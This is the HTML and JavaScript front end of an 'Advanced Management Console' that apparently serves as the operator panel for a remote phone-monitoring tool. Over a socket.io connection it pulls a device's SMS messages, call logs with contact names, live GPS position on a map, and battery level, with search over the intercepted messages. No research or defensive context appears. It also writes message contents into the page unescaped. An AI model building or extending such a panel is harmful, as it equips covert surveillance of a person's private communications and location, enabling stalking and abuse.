<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Advanced Management Console</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --bg: #f4f7f6; --sidebar: #2c3e50; --accent: #1abc9c; --white: #fff; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; background: var(--bg); }
        .sidebar { width: 250px; background: var(--sidebar); height: 100vh; position: fixed; color: white; }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; color: #bdc3c7; }
        .nav-item:hover, .nav-item.active { background: var(--accent); color: white; }
        .fixed-header { position: fixed; top: 0; left: 250px; right: 0; height: 90px; background: var(--white); border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; z-index: 1000; }
        .main-content { margin-left: 250px; padding-top: 110px; flex: 1; padding-inline: 30px; }
        .view { display: none; }
        .view.active { display: block; }
        .search-bar { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 6px; }
        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        th { background: #f8f9fa; padding: 12px; text-align: left; border-bottom: 2px solid #eee; font-size: 0.8rem; color: #777; }
        td { padding: 12px; border-bottom: 1px solid #eee; color: #333 !important; }
        .Incoming { color: #27ae60 !important; font-weight: bold; }
        .Outgoing { color: #2980b9 !important; font-weight: bold; }
        .Missed { color: #e74c3c !important; font-weight: bold; }
        #map { width: 100%; height: 500px; border-radius: 10px; border: 1px solid #ddd; }
    </style>
</head>
<body>

<div class="sidebar">
    <div style="padding: 25px; font-weight: bold; color: var(--accent); border-bottom: 1px solid #34495e;">CONSOLE v3</div>
    <div class="nav-item active" onclick="showView('dash')">üìä Dashboard</div>
    <div class="nav-item" onclick="showView('sms')">‚úâÔ∏è SMS Logs</div>
    <div class="nav-item" onclick="showView('calls')">üìû Call Logs</div>
    <div class="nav-item" onclick="showView('map-view')">üìç Live Map</div>
</div>

<div class="fixed-header">
    <div style="font-size: 0.9rem; color: #7f8c8d;">
        <span id="gps-addr" style="font-weight: bold; color: #2c3e50; display: block;">GPS Syncing...</span>
        Accuracy: <span id="gps-acc">--</span>m | <span id="gps-time">--</span>
    </div>
    <div style="display:flex; align-items:center; gap:20px;">
        <div id="status-dot" style="font-size:2.5rem; color:#e74c3c;">‚óè</div>
        <div style="font-size:1.5rem;"><span id="pct">--</span>% üîã</div>
    </div>
</div>

<div class="main-content">
    <div id="dash" class="view active"><h2>Device Status Nominal</h2></div>

    <div id="sms" class="view">
        <input type="text" id="smsSearch" class="search-bar" placeholder="Search SMS..." onkeyup="filter('sms')">
        <table>
            <thead><tr><th>Type</th><th>Number</th><th>Message</th><th>Date</th></tr></thead>
            <tbody id="sms-table"></tbody>
        </table>
    </div>

    <div id="calls" class="view">
        <input type="text" id="callSearch" class="search-bar" placeholder="Search Call Logs..." onkeyup="filter('calls')">
        <table>
            <thead><tr><th>Type</th><th>Number</th><th>Name</th><th>Duration</th><th>Date</th></tr></thead>
            <tbody id="call-table"></tbody>
        </table>
    </div>

    <div id="map-view" class="view"><div id="map"></div></div>
</div>

<script>
    const socket = io();
    let map, marker, allSMS = [], allCalls = [];

    function showView(id) {
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        if(id === 'map-view') { setTimeout(() => { if(!map) initMap(); map.invalidateSize(); }, 300); }
        if(id === 'sms') socket.emit('get-sms-request');
        if(id === 'calls') socket.emit('get-call-log-request');
    }

    function initMap() {
        map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        marker = L.marker([0, 0]).addTo(map);
    }

    socket.on('gps-update', (data) => {
        document.getElementById('gps-addr').innerText = data.address;
        document.getElementById('gps-acc').innerText = data.accuracy;
        document.getElementById('gps-time').innerText = data.time;
        if(map && data.lat) {
            const pos = [data.lat, data.lng];
            map.setView(pos, 16); marker.setLatLng(pos);
            document.getElementById('status-dot').style.color = "#2ecc71";
        }
    });

    socket.on('battery-status', (data) => {
        document.getElementById('pct').innerText = data.percent;
        document.getElementById('status-dot').style.color = "#2ecc71";
    });

    socket.on('sms-data-log', (data) => { allSMS = data; render('sms', data); });
    socket.on('call-log-data', (data) => { allCalls = data; render('calls', data); });

    function render(type, data) {
        const body = document.getElementById(type + '-table');
        if (type === 'sms') {
            body.innerHTML = data.map(m => `<tr><td class="${m.type}">${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
        } else {
            body.innerHTML = data.map(c => `<tr><td class="${c.type}">${c.type}</td><td>${c.number}</td><td>${c.name || 'Unknown'}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
        }
    }

    function filter(type) {
        const query = document.getElementById(type === 'sms' ? 'smsSearch' : 'callSearch').value.toLowerCase();
        const list = type === 'sms' ? allSMS : allCalls;
        const filtered = list.filter(item => Object.values(item).some(val => String(val).toLowerCase().includes(query)));
        render(type, filtered);
    }
</script>
</body>
</html>
